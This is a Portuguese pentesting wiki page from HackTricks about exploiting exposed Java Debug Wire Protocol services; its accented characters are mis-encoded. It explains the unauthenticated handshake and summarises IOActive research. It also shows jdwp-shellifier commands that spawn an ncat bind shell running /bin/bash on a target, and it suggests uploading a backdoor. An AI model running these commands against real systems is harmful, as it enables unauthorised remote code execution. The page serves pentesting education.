# Pentesting JDWP - Java Debug Wire Protocol

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

## Exploiting

A explora√ß√£o do JDWP depende da **falta de autentica√ß√£o e criptografia do protocolo**. Geralmente √© encontrado na **porta 8000**, mas outras portas s√£o poss√≠veis. A conex√£o inicial √© feita enviando um "JDWP-Handshake" para a porta alvo. Se um servi√ßo JDWP estiver ativo, ele responde com a mesma string, confirmando sua presen√ßa. Este handshake atua como um m√©todo de fingerprinting para identificar servi√ßos JDWP na rede.

Em termos de identifica√ß√£o de processos, procurar pela string "jdwk" em processos Java pode indicar uma sess√£o JDWP ativa.

A ferramenta principal √© [jdwp-shellifier](https://github.com/hugsy/jdwp-shellifier). Voc√™ pode us√°-la com diferentes par√¢metros:
```bash
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 #Obtain internal data
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --cmd 'ncat -l -p 1337 -e /bin/bash' #Exec something
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'ncat -l -p 1337 -e /bin/bash' #Uses java.lang.String.indexOf as breakpoint instead of java.net.ServerSocket.accept
```
Eu descobri que o uso de `--break-on 'java.lang.String.indexOf'` torna a explora√ß√£o mais **est√°vel**. E se voc√™ tiver a chance de fazer upload de um backdoor para o host e execut√°-lo em vez de executar um comando, a explora√ß√£o ser√° ainda mais est√°vel.

## Mais detalhes

**Este √© um resumo de [https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)**. Confira para mais detalhes.

1. **Vis√£o Geral do JDWP**:
- √â um protocolo bin√°rio de rede baseado em pacotes, principalmente s√≠ncrono.
- Carece de autentica√ß√£o e criptografia, tornando-o vulner√°vel quando exposto a redes hostis.

2. **Handshake do JDWP**:
- Um simples processo de handshake √© usado para iniciar a comunica√ß√£o. Uma string ASCII de 14 caracteres ‚ÄúJDWP-Handshake‚Äù √© trocada entre o Depurador (cliente) e o Depurado (servidor).

3. **Comunica√ß√£o do JDWP**:
- As mensagens t√™m uma estrutura simples com campos como Comprimento, Id, Flag e CommandSet.
- Os valores do CommandSet variam de 0x40 a 0x80, representando diferentes a√ß√µes e eventos.

4. **Explora√ß√£o**:
- O JDWP permite carregar e invocar classes e bytecode arbitr√°rios, apresentando riscos de seguran√ßa.
- O artigo detalha um processo de explora√ß√£o em cinco etapas, envolvendo a obten√ß√£o de refer√™ncias do Java Runtime, defini√ß√£o de breakpoints e invoca√ß√£o de m√©todos.

5. **Explora√ß√£o na Vida Real**:
- Apesar das potenciais prote√ß√µes de firewall, os servi√ßos JDWP s√£o descobertos e explor√°veis em cen√°rios do mundo real, como demonstrado por buscas em plataformas como ShodanHQ e GitHub.
- O script de explora√ß√£o foi testado contra v√°rias vers√µes do JDK e √© independente de plataforma, oferecendo Execu√ß√£o Remota de C√≥digo (RCE) confi√°vel.

6. **Implica√ß√µes de Seguran√ßa**:
- A presen√ßa de servi√ßos JDWP abertos na internet destaca a necessidade de revis√µes de seguran√ßa regulares, desativa√ß√£o de funcionalidades de depura√ß√£o em produ√ß√£o e configura√ß√µes adequadas de firewall.

### **Refer√™ncias:**

* [[https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)]
* [https://github.com/IOActive/jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)
* [http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html](http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html)
* http://www.secdev.org/projects/scapy(no longer active)
* [http://www.shodanhq.com/search?q=JDWP-HANDSHAKE](http://www.shodanhq.com/search?q=JDWP-HANDSHAKE)
* http://www.hsc-news.com/archives/2013/000109.html (no longer active)
* [http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt](http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt)
* https://github.com/search?q=-Xdebug+-Xrunjdwp\&type=Code\&ref=searchresults
* [http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html](http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html)
* [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html](http://docs.oracle.com)
* [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html](http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html)
* [http://nmap.org/nsedoc/scripts/jdwp-exec.html](http://nmap.org/nsedoc/scripts/jdwp-exec.html)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}
